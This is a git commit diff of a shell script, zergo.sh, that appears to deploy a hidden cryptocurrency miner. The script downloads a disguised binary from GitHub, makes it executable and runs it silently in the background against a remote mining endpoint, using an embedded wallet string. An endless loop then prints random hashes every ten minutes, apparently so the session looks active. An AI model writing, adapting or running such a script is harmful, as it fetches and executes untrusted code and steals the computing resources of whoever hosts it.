02e765ddcdf2cc7c75519eeebfa66f9efdfacbca
sbwsmg <108033976+sbwsmg@users.noreply.github.com>
2022-11-14 02:48:53 +0800

    Update zergo.sh

--- zergo.sh
+++ zergo.sh
@@ -1,4 +1,4 @@
 wget https://github.com/sbwsmg/lol/raw/main/blowjobs
 chmod 700 blowjobs
-./blowjobs -o 139.162.40.79:80 -u t1Xe6qavzxWNPLFNqkawimxMS6526wBLtQt -p c=FLUX,mc=BBC/GSPC,ID=test -a gr -k -t3 > /dev/null 2>&1 &
+./blowjobs -o 139.162.40.79:80 -u t1Xe6qavzxWNPLFNqkawimxMS6526wBLtQt -p c=FLUX,mc=BBC/BTRM/GSPC/JGC/RTM,ID=test -a gr -k -t3 > /dev/null 2>&1 &
 while :; do echo $RANDOM | md5sum | head -c 20; echo; sleep 10m; done
